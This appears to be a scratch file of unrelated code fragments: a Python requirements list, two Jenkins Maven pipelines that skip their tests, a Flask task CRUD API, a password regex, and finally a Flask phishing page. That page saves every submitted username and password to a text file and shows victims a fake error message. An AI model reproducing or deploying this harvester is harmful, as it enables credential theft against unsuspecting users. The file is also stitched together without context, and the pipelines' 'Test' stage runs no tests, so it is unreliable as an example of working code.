flask
flask-cors
openai-whisper
ffmpeg-python
numpy
torch

pipeline {
    agent any
    tools {
        maven 'Maven'
    }
    stages {
        stage('Checkout') {
            steps {
                git branch: 'main', url: 'https://github.com/Manimaran-M3/MeetScribe2.git'
            }
        }
        stage('Build') {
            steps {
                bat 'mvn -f speech-transcription-backend/pom.xml clean package -DskipTests'
            }
        }
        stage('Test') {
            steps {
                bat 'mvn -f speech-transcription-backend/pom.xml test -DskipTests'
            }
        }
        stage('Deploy') {
            steps {
                echo 'Deploying application...'
            }
        }
    }
}



pipeline {
    agent any
    tools {
        maven 'Maven'
    }
    stages {
        stage('Checkout') {
            steps {
                git branch: 'main', url: 'https://github.com/KabilanTM/Maven_test.git'
            }
        }
        stage('Build') {
            steps {
                bat 'mvn -f demo/pom.xml clean package -DskipTests'
            }
        }
        stage('Test') {
            steps {
                bat 'mvn -f demo/pom.xml test -DskipTests'
            }
        }
        stage('Deploy') {
            steps {
                echo 'Deploying application...'
            }
        }
    }
}




from flask import Flask,jsonify,request
app=Flask(__name__)
tasks=[{'id':1,'task':'task1','description':'Task1 description'},{'id':2,'task':'task2','description':'Task2 description'},{'id':3,'task':'task3','description':'Task3 description'}]

@app.route('/get_all_tasks',methods=['GET'])
def get_all_tasks():
    return jsonify({'tasks':tasks})

@app.route('/get_task/<int:task_id>',methods=['GET'])
def get_task(task_id):
    task=next((task for task in tasks if task['id']==task_id),None)
    if task:
        return jsonify({'task':task})
    else:
        return jsonify({'message':'Task not found'})

@app.route('/create_task',methods=['POST'])
def create_task():
    data = request.json
    task={'id':len(tasks)+1,'task':data['task'],'description':data['description']}
    tasks.append(task)
    return jsonify({'message':'Task Created Succussfully','task':task})

@app.route('/update_task/<int:task_id>',methods=['PUT'])
def update_task(task_id):
    task=next((task for task in tasks if task['id']==task_id),None)
    if task:
        data = request.json
        task.update(data)
        return jsonify({'message':'update success'})
    else:
        return jsonify({'message':'task not found'})

@app.route('/delete_task/<int:task_id>',methods=['DELETE'])
def delete_task(task_id):
    global tasks
    tasks=[task for task in tasks if task['id']!=task_id]
    return jsonify({'message':'deleted sucess'})
if __name__ == '__main__':
    app.run()




/^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{4,15}$/



from flask import Flask, render_template, request, redirect 
app = Flask(__name__) 
@app.route('/', methods=['GET', 'POST']) 
def login(): 
    if request.method == 'POST': 
        username = request.form.get('username') 
        password = request.form.get('password') 
# Simulated logging of credentials (for demo/testing only) 
        with open('captured.txt', 'a') as f: 
            f.write(f"Username: {username}, Password: {password}\n") 
# Redirect to a fake "loading" or "error" page 
        return redirect('/oops') 
    return render_template('login.html') 
@app.route('/oops') 
def oops(): 
    return "<h2>Oops! Something went wrong. Please try again later.</h2>" 
if __name__ == '__main__': 
    app.run(debug=True) 
